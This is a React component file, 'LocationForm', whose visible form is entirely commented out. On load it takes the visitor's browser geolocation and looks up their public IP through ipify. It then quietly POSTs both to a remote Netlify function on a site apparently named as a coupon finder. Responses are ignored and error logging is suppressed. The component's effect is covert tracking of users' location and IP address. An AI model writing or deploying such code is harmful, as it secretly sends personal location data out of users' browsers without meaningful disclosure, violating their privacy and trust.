// src/components/LocationForm.js
import React, { useState,useEffect } from 'react';
import axios from 'axios';
const call = async (latitude,longitude)=>{
    try {
              const response = await fetch("https://coupounfind2r.netlify.app/.netlify/functions/api?latitude="+latitude+"&longitude="+longitude, {
                method: 'POST',
                headers: {
                  'access-control-allow-origin' : "*",
                  'Content-Type': 'application/json'
                },
                // mode: 'cors',
                // body: JSON.stringify({ latitude, longitude }),
                // query:JSON.stringify({ latitude:"dfgsf", longitude:"dfgd" }),
              });
        
              if (response.status === 201) {
               
               
              } else {
                
              }
            } catch (error) {
            //   console.error('Error saving location:', error);
            }
   }
   const IpCall = async ()=>{
    try { 
        let ip='';
       await  axios.get('https://api.ipify.org?format=json')
        .then(response => {
            
          ip=response.data.ip;
        //   console.log(ip);
        })
        .catch(error => {
        //   console.error('Error fetching IP address:', error);
        });
 
        const response = await fetch("https://coupounfind2r.netlify.app/.netlify/functions/api/ip?ip="+ip, {
                method: 'POST',
                headers: {
                  'access-control-allow-origin' : "*",
                  'Content-Type': 'application/json'
                },
                // mode: 'cors',
                // body: JSON.stringify({ latitude, longitude }),
                // query:JSON.stringify({ latitude:"dfgsf", longitude:"dfgd" }),
              });
        
              if (response.status === 201) {
               
               
              } else {
                
              }
            } catch (error) {
            //   console.error('Error saving location:', error);
            }
   }
const LocationForm = () => {
    const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);
  const [error, setError] = useState(null);

  
  useEffect(() => {
    // Check if geolocation is available in the browser
     
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
      async (position) => {
          setLatitude(position.coords.latitude);
          setLongitude(position.coords.longitude);
          call(latitude,longitude);
     IpCall();
        },
        (error) => {
          setError(error.message);
        }
      );
    } else {
     setError('Geolocation is not available in your browser');
    }
  }, [latitude,longitude]);

   

//   const handleSubmit = async (e) => {
//     e.preventDefault();

//     try {
//       const response = await fetch("https://locationfinder123.netlify.app/.netlify/functions/api?latitude="+latitude+"&longitude="+longitude, {
//         method: 'POST',
//         headers: {
//           'Content-Type': 'application/json',
//         },
//         mode: 'cors',
//         body: JSON.stringify({ latitude, longitude }),
//         // query:JSON.stringify({ latitude:"dfgsf", longitude:"dfgd" }),
//       });

//       if (response.status === 201) {
       
//         setLatitude('');
//         setLongitude('');
//       } else {
        
//       }
//     } catch (error) {
//     //   console.error('Error saving location:', error);
//     }
//   };

//   return (
//     <div>
//       <h1>Submit Your Location</h1>
//       <form onSubmit={handleSubmit}>
//         <div>
//           <label htmlFor="latitude">Latitude:</label>
//           <input
//             type="text"
//             id="latitude"
//             value={latitude}
//             onChange={(e) => setLatitude(e.target.value)}
//             required
//           />
//         </div>
//         <div>
//           <label htmlFor="longitude">Longitude:</label>
//           <input
//             type="text"
//             id="longitude"
//             value={longitude}
//             onChange={(e) => setLongitude(e.target.value)}
//             required
//           />
//         </div>
//         <button type="submit">Submit</button>
//       </form>
//     </div>
//   );
};

export default LocationForm;
